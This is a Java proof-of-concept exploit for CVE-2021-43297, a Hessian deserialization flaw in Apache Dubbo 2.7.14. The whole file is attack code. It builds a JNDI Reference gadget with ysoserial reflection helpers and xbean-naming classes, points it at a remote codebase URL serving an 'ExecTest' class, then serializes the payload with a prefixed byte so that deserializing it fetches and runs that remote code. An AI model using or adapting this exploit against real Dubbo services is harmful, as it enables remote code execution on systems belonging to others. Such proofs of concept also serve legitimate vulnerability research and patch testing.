package dubbo.cve;


import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;
import dubbo.util.Serialization;
import ysoserial.payloads.util.Reflections;

import javax.naming.Context;
import javax.naming.Reference;

/**
 * 测试版本: dubbo 2.7.14
 * 修复版本: dubbo 2.7.15
 */
public class CVE_2021_43297 {

    public static void main(String[] args) throws Exception {


        Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
        Reference ref = new Reference("ExecTest", "ExecTest","http://127.0.0.1:8000/");
        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", ref, ctx);
        Reflections.setFieldValue(binding, "fullName", "<<<<<");

        byte[] data = Serialization.hessian2Serialize(binding);

        byte[] poc = new byte[data.length + 1];
        System.arraycopy(new byte[]{67}, 0, poc, 0, 1);
        System.arraycopy(data, 0, poc, 1, data.length);
        Serialization.hessian2Unserialize(poc);

    }
}
